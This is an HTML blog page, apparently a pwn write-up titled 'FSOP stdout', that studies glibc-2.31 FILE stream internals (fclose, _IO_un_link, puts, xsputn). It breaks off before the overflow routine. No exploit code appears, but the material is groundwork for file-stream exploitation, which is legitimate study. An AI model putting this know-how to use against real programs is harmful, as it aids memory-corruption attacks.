@@ -1,0 +1,839 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+
+    gtag('config', 'true');
+  </script>
+  <!-- End Google Analytics -->
+
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    FSOP stdout |
+    
+    whoisthatguy
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="FSOP stdoutFSOP stdout Analysis1. fclose fclose() → __IO_new_fclose 1#define fclose(fp) _IO_new_fclose (fp)   src (glibc-2.31)   12345678910111213141516171819202122232425262728293031323334353637383940">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FSOP stdout">
+<meta property="og:url" content="http://wh0isthatguy.github.io/2023/10/13/fsop-stdout/index.html">
+<meta property="og:site_name" content="whoisthatguy">
+<meta property="og:description" content="FSOP stdoutFSOP stdout Analysis1. fclose fclose() → __IO_new_fclose 1#define fclose(fp) _IO_new_fclose (fp)   src (glibc-2.31)   12345678910111213141516171819202122232425262728293031323334353637383940">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry9OZ6LWp.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ-1VTIW6.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1qTwTLWT.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Byi0waU-T.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJV-_6Uba.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkKwGRIZa.png">
+<meta property="article:published_time" content="2023-10-13T13:49:24.000Z">
+<meta property="article:modified_time" content="2024-10-30T13:51:27.346Z">
+<meta property="article:author" content="whoisthatguy">
+<meta property="article:tag" content="fsop">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/ry9OZ6LWp.png">
+  
+  
+  
+    <link rel="shortcut icon" href="https://uploads-public.hackmd.io/upload_a391ca5a866f9b0463c380b8e3b6d963.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">UwU....</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="https://hackmd.io/_uploads/SJ3ApaLZp.png" alt="FSOP stdout">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">FSOP stdout</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-fsop-stdout" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2023/10/13/fsop-stdout/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2023-10-13T13:49:24.000Z" itemprop="datePublished">2023-10-13</time>
+    <time style="display: none;" id="post-update-time">2024-10-30</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/" data-aos="zoom-in">pwn</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="FSOP-stdout"><a href="#FSOP-stdout" class="headerlink" title="FSOP stdout"></a>FSOP stdout</h1><p>FSOP stdout</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="1-fclose"><a href="#1-fclose" class="headerlink" title="1. fclose"></a>1. fclose</h3><p><img src="https://hackmd.io/_uploads/ry9OZ6LWp.png"></p>
+<p><code>fclose()</code> → <code>__IO_new_fclose</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fclose(fp) _IO_new_fclose (fp)</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>src (glibc-2.31)</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">	 the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.step);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.step);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">	_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_deallocate_file (fp);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Control Flow:</p>
+<ol>
+<li>check <code>fp</code> through <code>CHECK_FILE(fp, EOF);</code></li>
+<li>if detect old streams (vtable available or not) then call  <code>_IO_old_fclose</code> </li>
+<li>if _flag  &#x3D; 0x2000 (_IO_IS_FILEBUF) → call <code>_IO_un_link</code></li>
+<li>if _flag  &#x3D; 0x2000 (_IO_IS_FILEBUF) → call &#96;_IO_file_close_it</li>
+<li>call <code>_IO_FINISH</code></li>
+</ol>
+<h3 id="2-IO-un-link"><a href="#2-IO-un-link" class="headerlink" title="2. __IO_un_link"></a>2. __IO_un_link</h3><ul>
+<li><p>scr (glibc-2.31)</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">	;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">	_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	<span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">	  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">	    &#123;</span><br><span class="line">	      *f = fp-&gt;file._chain;</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Control Flow:</p>
+<ol>
+<li>if <code>_flags = 0x0080</code> then doing the below stuff</li>
+<li>check if <code>fp == _IO_list_all</code> → <code>_IO_list_all</code> point to the next fp in _chain</li>
+<li>loop from the _chain list starting from <code>_IO_list_all</code> , if found fp then remove it </li>
+<li>mark the _flag to indicate it closed <code>fp-&gt;file._flags &amp;= ~_IO_LINKED</code></li>
+</ol>
+<h3 id="3-IO-file-close-it"><a href="#3-IO-file-close-it" class="headerlink" title="3. _IO_file_close_it"></a>3. <strong><strong>_IO_file_close_it</strong></strong></h3><p><code>_IO_file_close_it</code> →<code>_IO_new_file_close_it</code></p>
+<ul>
+<li><p>src (glibc-2.31)</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write_status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">		      ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_wbackup (fp))</span><br><span class="line">	_IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">      _IO_wsetg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      _IO_wsetp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  _IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  _IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Control Flow :</p>
+<ol>
+<li>check if file is open </li>
+<li>check if the file is open in write mode<ul>
+<li><code>_IO_NO_WRITES</code>  (0x0008)</li>
+<li><code>_IO_CURRENTLY_PUTTING</code></li>
+<li>if satisfied → call <code>_IO_do_flush</code> to flush the buffer and initialize the pointers</li>
+</ul>
+</li>
+<li>check _flags2 &#x3D;&#x3D; <code>_IO_FLAGS2_NOCLOSE]</code>(32) → <code>_IO_SYSCLOSE</code> (<code>__close</code> in vtable)</li>
+</ol>
+<h3 id="4-puts"><a href="#4-puts" class="headerlink" title="4. puts"></a>4. puts</h3><p><code>puts</code> → <code>_IO_puts</code> </p>
+<ul>
+<li><p>src</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Note that in the scr code, it will call  <code>_IO_sputn</code> which mean that <code>__xsputn</code> from vtable of stdout will be call </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(_IO_FILE_plus)_IO_2_1_stdout→vtable.__xsputn(<span class="built_in">stdout</span>, str, len)</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>_IO_new_file_xsputn</code></strong></p>
+<ul>
+<li><p>src</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);</span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Control Flow :</p>
+<ol>
+<li>check available space in the buffer </li>
+<li>fill the buffer : <code>f-&gt;_IO_write_ptr</code> &#x3D; <code>__mempcpy (f-&gt;_IO_write_ptr)</code></li>
+<li>if to-do remain <code>_IO_OVERFLOW</code> is called</li>
+<li>finally call <code>_IO_default_xsputn</code> to write</li>
+</ol>
+<p>→ we focus on<code>_IO_OVERFLOW</code></p>
+<p>  <code>_IO_new_file_overflow</code></p>
+<ul>
+<li><p>scr</p>
